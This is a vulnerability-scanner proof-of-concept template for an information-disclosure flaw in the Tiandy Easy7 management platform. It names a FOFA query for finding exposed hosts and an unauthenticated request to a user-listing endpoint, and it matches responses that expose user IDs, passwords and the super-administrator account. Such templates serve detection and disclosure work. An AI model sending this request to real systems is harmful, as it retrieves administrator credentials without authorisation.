id: poc-yaml-tiandy-easy7-imp-loadalluserbeans-info-leak
info:
  name: 天地伟业Easy7综合管理平台 loadAllUserBeans 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: Easy7综合管理平台
  fofa: app="Tiandy-Easy7"
requests:
- method: GET
  path: /Easy7/rest/user/loadAllUserBeans
  expression: status_code == 200 && contains(body,"\"userId\":") && contains(body,"\"password\":")
    && contains(body,"\"userCaption\":") && contains(body,"超级管理员") && !contains(body,"<")
variables: {}
transport: http
